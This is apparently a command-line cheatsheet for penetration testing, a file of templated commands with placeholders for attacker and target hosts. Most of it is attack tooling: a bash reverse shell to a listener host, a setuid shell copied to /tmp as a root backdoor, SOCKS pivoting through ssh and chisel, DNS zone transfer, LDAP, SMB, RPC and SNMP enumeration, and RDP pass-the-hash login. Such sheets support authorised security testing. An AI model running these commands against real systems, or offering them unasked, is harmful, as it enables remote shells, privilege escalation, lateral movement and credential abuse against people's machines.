% pentest,sh

$ lhost: ip -j address | jq -r '.[].addr_info.[]|select(.label)|[.label,.local]|@tsv' --- --delimiter '\t' --column 2 --prevent-extra
$ rhost: getent hosts | awk '{printf "%s\t%s\n",$2,$1}' --- --delimiter '\t' --column 2 --prevent-extra
$ dict: find ~/Documents/SecLists -type f --- --prevent-extra

# bash reverse shell
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1

# bash privileged shell
cp /bin/sh /tmp/sh && chmod +s /tmp/sh

# docker check permission
ip link add dummy0 type dummy && ip link delete dummy0

# ssh socks
ssh -D <lport> <username>@<rhost>

# ssh reverse socks
ssh -R <lport> <username>@<lhost>

# chisel reverse server
chisel server -p <lport> --reverse

# chisel reverse client
chisel client <lhost>:<lport> R:<lport2>:socks

# nmap ipv6
nmap -6 <rhost>

# dig zone transfer
dig axfr @<rhost> <domain>

# ldapsearch base
ldapsearch -x -H ldap://<rhost> -s base

# ldapsearch auth
ldapsearch -x -H ldap://<rhost> -D <username>@<domain> -w <password> -b 'dc=<dc0>,dc=<dc1>'

# smbclient list
smbclient -U <username> -L <rhost>

# smbclient access
smbclient -U <username> '\\''<rhost>''\''<share>'

# rpcclient
rpcclient -U <username> <rhost>

# snmpwalk
snmpwalk -v 2c -c public <rhost> .1 ET-SNMP-EXTEND-MIB::nsExtendOutputFull

# xfreerdp password auth
xfreerdp /cert-ignore /u:<username> /p:<password> /v:<rhost> /d:<domain>

# xfreerdp ntlm auth
xfreerdp /cert-ignore /u:<username> /pth:<ntlm> /v:<rhost> /d:<domain>
